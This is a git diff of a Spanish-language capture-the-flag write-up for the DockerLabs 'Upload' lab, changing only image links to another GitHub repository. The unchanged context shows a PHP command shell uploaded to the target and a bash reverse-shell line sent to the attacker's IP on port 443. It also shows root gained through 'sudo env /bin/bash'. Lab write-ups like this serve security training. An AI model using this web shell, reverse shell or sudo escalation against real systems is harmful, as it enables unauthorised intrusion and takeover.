@@ -1,4 +1,4 @@
-![image](https://github.com/Crisstianpd/CTFs/blob/da0262891d6ffdbc167d40b4916f9aabcbd30f15/DockerLabs/Easy/Upload/imgs/upload-banner.png)
+![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-banner.png)
 
 [Maquina](https://mega.nz/file/pOdwgYbB#8lTyf-mWFNq7xvKWObKUV9gkrZj3nzhuHVlGQmnZ6BQ)   \   [Dockerlabs](https://dockerlabs.es/)
 
@@ -31,7 +31,7 @@ En los resultados del escaneo podemos ver que dentro del **puerto 80** se aloja 
 
 Visualizamos la pagina web.
 
-![image](https://github.com/Crisstianpd/CTFs/blob/da0262891d6ffdbc167d40b4916f9aabcbd30f15/DockerLabs/Easy/Upload/imgs/upload-img1.png)
+![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img1.png)
 
 Al tener la oportunidad de subir archivos a una web, en lo primero que pensariamos es en subir un archivo *php* con el que podamos ejecutar comandos dentro de la maquina atraves de un paramentro definido en el script. Esto sera asi en caso de que la maquina no aplique ningun tipo de sanitizacion sobre los tipos de archivos que se pueden subir.
 
@@ -66,7 +66,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 Si revisamos ese directorio podremos ver que ahi se encuntra alojado nuestro archivo *test.php*.
 
-![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img2.png)
+![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img2.png)
 
 Nos dirijimos directamente atraves de la URL a nuestro archivo php y hacemos un llamado al parametro que predefinimos anteriormente para que ejecute el comando `id` en la maquina.
 
@@ -74,7 +74,7 @@ Nos dirijimos directamente atraves de la URL a nuestro archivo php y hacemos un 
 http://172.17.0.2/uploads/test.php?cmd=id
 ```
 
-![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img3.png)
+![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img3.png)
 Al hacer esto podremos observar la respuesta del servidor ante el comando `id` por lo que el archivo funciona y el servidor interpreta de forma correcta las peticiones hechas atraves del archivo php. Sabiendo esto, podemos intentar entablar una revershell del servidor a nuestra maquina atacante. 
 
 ## Explotacion
@@ -87,7 +87,7 @@ Y atraves del parametro `cmd` de nuestro archivo le hacemos la peticion al servi
 ```shell
 http://172.17.0.2/uploads/test.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
 ```
-![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img4.png)
+![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img4.png)
 Y hemos logrado ganar acceso como el usuario *www-data*.
 
 ## Escalada de privilegios
@@ -108,7 +108,7 @@ sudo env /bin/bash
 
 Y comprobamos con el comando `whoami` o `id` que ya somos usuario *root*.
 
-![image](https://github.com/Crisstianpd/CTFs/blob/f45ffec0d097da4e06089b4f4224cc077d4140cd/DockerLabs/Easy/Upload/imgs/upload-img5.png)
+![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img5.png)
 
 ##
 
